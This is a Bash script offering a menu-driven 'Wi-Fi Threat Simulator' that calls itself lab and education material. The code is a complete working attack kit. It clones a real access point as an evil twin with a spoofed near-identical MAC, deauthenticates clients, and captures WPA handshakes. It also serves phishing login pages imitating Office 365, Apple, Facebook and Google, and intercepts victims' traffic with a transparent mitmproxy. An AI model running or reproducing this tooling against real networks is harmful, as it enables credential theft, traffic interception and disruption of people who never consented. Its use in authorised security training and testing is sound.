#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
CYAN='\033[1;36m'
NC='\033[0m'

set -e

BASE="/opt/wifi-threat-sim-main"
AP_CONF="$BASE/configs/hostapd.conf"
DNS_CONF="$BASE/configs/dnsmasq.conf"
PHISH_PORTAL="$BASE/phishing_portal"
SKINS_DIR="$PHISH_PORTAL/skins"
LOGDIR="$BASE/logs"
MITM_LOG="$LOGDIR/mitmproxy.log"
MITMSTATE="off"
[ -d "$LOGDIR" ] || mkdir -p "$LOGDIR"
[ -d "$SKINS_DIR" ] || mkdir -p "$SKINS_DIR"

declare -A SKIN_TO_REDIRECT=(
    [o365.html]="https://outlook.office.com/"
    [apple.html]="https://appleid.apple.com/"
    [facebook.html]="https://facebook.com/"
    [google.html]="https://accounts.google.com/"
    [cafe.html]="https://apple.com/"
)

SELECTED_SKIN="cafe.html"

function check_cmd() {
    command -v "$1" >/dev/null 2>&1 || { echo -e "${RED}[!] Missing required tool: $1${NC}"; exit 1; }
}

function stop_pyserver() {
    sudo pkill -f "$PHISH_PORTAL/server.py" && echo -e "${GREEN}[✓] Captive phishing server stopped.${NC}"
}

function install_deps() {
    PKGS=(hostapd dnsmasq iw aircrack-ng python3 openssl mitmproxy)
    MISSING=()
    for p in "${PKGS[@]}"; do
        command -v $p >/dev/null 2>&1 || MISSING+=($p)
    done
    if [ ${#MISSING[@]} -eq 0 ]; then
        echo -e "${GREEN}All dependencies are already installed!${NC}"; return;
    fi
    echo -e "${YELLOW}You are missing:${NC} ${MISSING[*]}"
    read -p "Install with your system package manager? [Y/n]: " ans
    [[ $ans =~ ^[Nn] ]] && echo "Aborted." && return
    if command -v apt >/dev/null 2>&1; then
        sudo apt update
        sudo apt install -y "${MISSING[@]}"
    elif command -v dnf >/dev/null 2>&1; then
        sudo dnf install -y "${MISSING[@]}"
    elif command -v yum >/dev/null 2>&1; then
        sudo yum install -y "${MISSING[@]}"
    elif command -v pacman >/dev/null 2>&1; then
        sudo pacman -Sy --noconfirm "${MISSING[@]}"
    else
        echo -e "${RED}No supported package manager found (apt, dnf, yum, pacman).${NC}"
        return 1
    fi
    echo -e "${GREEN}Dependencies installation complete.${NC}"
}

function cleanup() {
    sudo pkill -f 'hostapd.*config' 2>/dev/null || true
    sudo pkill -f 'dnsmasq.*config' 2>/dev/null || true
    sudo pkill -f 'airodump-ng' 2>/dev/null || true
    sudo pkill -f 'aireplay-ng' 2>/dev/null || true
    sudo pkill -f "python3 $PHISH_PORTAL/server.py" 2>/dev/null || true
    sudo pkill -f mitmproxy 2>/dev/null || true
    sudo pkill -f mitmweb 2>/dev/null || true
    sudo iptables -F 2>/dev/null || true
    sudo iptables -t nat -F 2>/dev/null || true
    sudo systemctl restart NetworkManager 2>/dev/null || sudo service network-manager restart 2>/dev/null || true
    [ -n "$IFACE" ] && sudo ip link set "$IFACE" down 2>/dev/null || true
    sleep 1
    echo -e "${GREEN}[✓] Reset complete.${NC}"
}

trap cleanup EXIT

function banner() {
    clear
    echo -e "${BLUE}"
    echo "  ___  _  _ ___ _  _ _      _        _       _       _         "
    echo " |_ _|| \\| | __| \\| | |    /_\\  _ _| |_ ___| |___  | |___ ___ "
    echo "  | | | .\` | _|| .\` | |__ / _ \\| ' \\  _/ _ \\ / -_) | / -_|_-/"
    echo " |___||_|\\_|___|_|\\_|____/_/ \\_||_|\\__\\___/_\\___| |_\\___/__|"
    echo -e "${CYAN}    Wi-Fi Threat Simulator - For Lab/Education only ${NC}\n"
    echo -e "${YELLOW}MITM Status: $MITMSTATE${NC}\n"
}

function prompt_iface(){
    iwlist_out=$(iw dev 2>/dev/null | awk '/Interface/ {print NR") " $2}')
    if [ -z "$iwlist_out" ]; then
        echo -e "${RED}[!] No wireless interface found. Aborting.${NC}"
        exit 1
    fi
    echo -e "${CYAN}Available interfaces:${NC}"
    echo "$iwlist_out"
    while true; do
        read -p "Select interface number: " ifaceidx
        IFACE=$(iw dev 2>/dev/null | awk '/Interface/ {print $2}' | sed -n "${ifaceidx}p")
        [ -n "$IFACE" ] && break
        echo -e "${RED}Invalid choice. Try again.${NC}"
    done
}

function scan_wifi_interfaces_and_networks() {
    iwlist_out=$(iw dev 2>/dev/null | awk '/Interface/ {print " - " $2}')
    if [ -z "$iwlist_out" ]; then
        echo -e "${RED}No wireless interface found.${NC}"
        read -p "Press Enter to return to menu..."
        return
    fi
    echo -e "${CYAN}Available wireless interfaces:${NC}"
    echo "$iwlist_out"
    echo
    for iface in $(iw dev 2>/dev/null | awk '/Interface/ {print $2}'); do
        echo -e "${YELLOW}[Interface: $iface]${NC}"
        sudo iw "$iface" scan 2>/dev/null | grep -E 'SSID:|primary channel' | awk '
            /primary channel:/ {chan=$3}
            /SSID:/ {printf "  SSID: %-30s Channel: %s\n", substr($0, index($0,$2)), chan}'
    done
    read -p "Press Enter to return to menu..."
}

function gen_configs() {
    mkdir -p $(dirname "$AP_CONF")
    cat > "$AP_CONF" <<EOF
interface=$IFACE
driver=nl80211
ssid=$FAKESSID
hw_mode=g
channel=$CHANNEL
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=$FAKEPASS
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF
    cat > "$DNS_CONF" <<EOF
interface=$IFACE
dhcp-range=10.0.0.10,10.0.0.250,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
listen-address=10.0.0.1
EOF
}

function start_rogue_ap(){
    check_cmd iw
    check_cmd ip
    prompt_iface
    echo -e "${CYAN}Scanning for APs. Please wait...${NC}"
    SCAN_FILE=$(mktemp)
    sudo timeout 5s iw "$IFACE" scan 2>/dev/null > "$SCAN_FILE"
    MAPSIDS=()
    MACS=()
    CHANS=()
    id=1
    while read -r mac;
    do
        ssid=$(awk -v mac="$mac" '
            $0 ~ mac {found=1}
            found && /SSID:/ {sub("SSID: ", ""); print; exit}
        ' "$SCAN_FILE" | head -1)
        chan=$(awk -v mac="$mac" '
            $0 ~ mac {found=1}
            found && /primary channel:/ {print $3; exit}
        ' "$SCAN_FILE" | head -1)
        [ -z "$ssid" ] && continue
        printf "%2d) SSID: %-30s BSSID: %s Channel: %s\n" $id "$ssid" "$mac" "$chan"
        MAPSIDS+=("$ssid")
        MACS+=("$mac")
        CHANS+=("$chan")
        id=$((id+1))
    done < <(grep -oE 'BSS ([0-9A-Fa-f:]{17})' "$SCAN_FILE" | awk '{print $2}' | uniq)
    rm -f "$SCAN_FILE"
    if [ ${#MACS[@]} -eq 0 ]; then echo -e "${RED}No AP found!${NC}"; return; fi
    read -p "Clone which AP? (number): " twin
    twinidx=$((twin-1))
    FAKESSID="${MAPSIDS[$twinidx]}"
    REALMAC="${MACS[$twinidx]}"
    CHANNEL="${CHANS[$twinidx]}"
    if [ -z "$FAKESSID" ] || [ -z "$REALMAC" ]; then echo -e "${RED}Invalid selection.${NC}"; return; fi
    read -p "Set fake WPA2 password: " FAKEPASS
    IFS=':' read -r -a macarr <<< "$REALMAC"
    last=$(( 0x${macarr[5]} ))
    new_last=$(printf "%02x" $(( (last + 1) & 0xff )) )
    FAKEMAC="${macarr[0]}:${macarr[1]}:${macarr[2]}:${macarr[3]}:${macarr[4]}:$new_last"
    sudo ip link set "$IFACE" down 2>/dev/null
    sudo ip link set "$IFACE" address "$FAKEMAC"
    sudo ip link set "$IFACE" up
    sudo ip addr flush dev "$IFACE" 2>/dev/null
    sudo ip addr add 10.0.0.1/24 dev "$IFACE"
    sudo pkill -f 'hostapd.*config' 2>/dev/null || true
    sudo pkill -f 'dnsmasq.*config' 2>/dev/null || true
    gen_configs
    sudo hostapd "$AP_CONF" > /tmp/hostapd.log 2>&1 &
    sleep 3
    sudo dnsmasq -C "$DNS_CONF" > /tmp/dnsmasq.log 2>&1 &
    sudo iptables -t nat -A POSTROUTING -o "$IFACE" -j MASQUERADE 2>/dev/null || true
    sudo iptables -A FORWARD -i "$IFACE" -j ACCEPT 2>/dev/null || true
    echo -e "${GREEN}[+] Evil Twin \"$FAKESSID\" running on channel $CHANNEL, MAC $FAKEMAC, captive portal at 10.0.0.1${NC}"
}

function deauth_attack() {
    prompt_iface
    read -p "AP BSSID (target): " BSSID; [ -z "$BSSID" ] && echo -e "${RED}No BSSID given${NC}" && return
    while true; do read -p "Channel: " CH; [[ "$CH" =~ ^[0-9]+$ ]] && break; echo -e "${RED}Invalid channel${NC}"; done
    sudo ip link set "$IFACE" down 2>/dev/null
    sudo iw "$IFACE" set monitor control
    sudo ip link set "$IFACE" up
    sudo airodump-ng -c "$CH" --bssid "$BSSID" "$IFACE"
    read -p "Station (leave empty for broadcast): " STATION
    if [ -z "$STATION" ]; then
        sudo aireplay-ng --deauth 25 -a "$BSSID" "$IFACE"
    else
        sudo aireplay-ng --deauth 25 -a "$BSSID" -c "$STATION" "$IFACE"
    fi
}

function handshake_capture() {
    prompt_iface
    read -p "AP BSSID (target): " BSSID; [ -z "$BSSID" ] && echo -e "${RED}No BSSID entered${NC}" && return
    while true; do read -p "Channel: " CH; [[ "$CH" =~ ^[0-9]+$ ]] && break; echo -e "${RED}Invalid channel${NC}"; done
    TS=$(date +%Y%m%d_%H%M%S)
    OUTFILE="$LOGDIR/handshake_$TS"
    sudo airodump-ng -c "$CH" --bssid "$BSSID" -w "$OUTFILE" "$IFACE"
}

function select_portal_skin() {
    skins=($SKINS_DIR/*.html)
    if [ ! -f "${skins[0]}" ]; then echo -e "${RED}No skins found in $SKINS_DIR${NC}"; return; fi
    echo -e "${CYAN}Available phishing portal skins:${NC}"
    for i in "${!skins[@]}"; do
        bname=$(basename "${skins[$i]}")
        echo "$((i+1))) $bname"
    done
    read -p "Select a skin by number: " skn
    [[ "$skn" =~ ^[0-9]+$ ]] && (( skn >= 1 && skn <= ${#skins[@]} )) || { echo "Invalid choice"; return; }
    cp "${skins[$((skn-1))]}" "$PHISH_PORTAL/index.html"
    SELECTED_SKIN=$(basename "${skins[$((skn-1))]}")
    echo -e "${GREEN}[✓] Selected skin: $SELECTED_SKIN${NC}"
}

function phishing_portal() {
    SKINBN=$(basename "$SELECTED_SKIN")
    REDIRECT="${SKIN_TO_REDIRECT[$SKINBN]}"
    [ -z "$REDIRECT" ] && REDIRECT="https://apple.com/"
    read -p "Launch portal as HTTP (port 80) or HTTPS (port 443)? [http/https]: " proto
    cd "$PHISH_PORTAL"
    if [[ "$proto" =~ ^[Hh][Tt][Tt][Pp][Ss]$ ]]; then
        sudo python3 server.py --https --redirect "$REDIRECT" &
        echo -e "${GREEN}[+] Captive portal running on HTTPS (https://10.0.0.1, redirect $REDIRECT)${NC}"
    else
        sudo python3 server.py --redirect "$REDIRECT" &
        echo -e "${GREEN}[+] Captive portal running on HTTP (http://10.0.0.1, redirect $REDIRECT)${NC}"
    fi
    cd "$BASE"
    read -p "Press Enter to kill captive portal and return to menu..."
    pkill -f "python3 $PHISH_PORTAL/server.py"
}

function start_mitmproxy() {
    [ "$MITMSTATE" = "on" ] && echo -e "${YELLOW}[!] MITMProxy already running!${NC}" && return
    read -p "MITMProxy ui or cli? [ui/cli]: " mode
    if [ "$mode" = "ui" ]; then
        sudo mitmweb --mode transparent --showhost --listen-port 8080 > "$MITM_LOG" 2>&1 &
    else
        sudo mitmproxy --mode transparent --showhost --listen-port 8080 > "$MITM_LOG" 2>&1 &
    fi
    sudo iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 80 -j REDIRECT --to-port 8080
    sudo iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 443 -j REDIRECT --to-port 8080
    MITMSTATE="on"
    echo -e "${GREEN}[+] MITMProxy enabled. Logs at $MITM_LOG.${NC}"
}

function stop_mitmproxy() {
    sudo pkill -f mitmproxy || true
    sudo pkill -f mitmweb || true
    sudo iptables -t nat -D PREROUTING -i "$IFACE" -p tcp --dport 80 -j REDIRECT --to-port 8080 || true
    sudo iptables -t nat -D PREROUTING -i "$IFACE" -p tcp --dport 443 -j REDIRECT --to-port 8080 || true
    MITMSTATE="off"
    echo -e "${GREEN}[+] MITMProxy stopped.${NC}"
}

while true; do
    banner
    echo -e "${BLUE}0) Install/check dependencies${NC}"
    echo -e "${BLUE}1) Scan WiFi interfaces & networks${NC}"
    echo -e "${BLUE}2) Start Rogue AP (Evil Twin, auto MAC-sim/chan/SSID)${NC}"
    echo -e "${BLUE}3) Deauth client(s) from real AP${NC}"
    echo -e "${BLUE}4) Capture WPA Handshake${NC}"
    echo -e "${BLUE}5) Choose phishing portal skin${NC}"
    echo -e "${BLUE}6) Launch Captive Phishing Portal${NC}"
    echo -e "${BLUE}7) Stop Captive Phishing Portal (if running)${NC}"
    if [ "$MITMSTATE" = "on" ]; then
        echo -e "${YELLOW}8) Stop MITMProxy + logs${NC}"
    else
        echo -e "${BLUE}8) Launch MITMProxy (sniff/intercept)${NC}"
    fi
    echo -e "${BLUE}9) SAFE TEARDOWN/RESET${NC}"
    echo -e "${BLUE}10) Exit${NC}"
    echo -ne "${CYAN}Your choice [0-10]: ${NC}"; read CHOICE
    case $CHOICE in
        0) install_deps ;;
        1) scan_wifi_interfaces_and_networks ;;
        2) start_rogue_ap ;;
        3) deauth_attack ;;
        4) handshake_capture ;;
        5) select_portal_skin ;;
        6) phishing_portal ;;
        7) stop_pyserver ;;
        8) if [ "$MITMSTATE" = "off" ]; then start_mitmproxy; else stop_mitmproxy; fi ;;
        9) cleanup ;;
        10) echo -e "${GREEN}Bye!${NC}"; exit 0 ;;
        *) echo -e "${RED}[!] Invalid option.${NC}" ;;
    esac
    read -p "Press Enter to return to menu..."
done
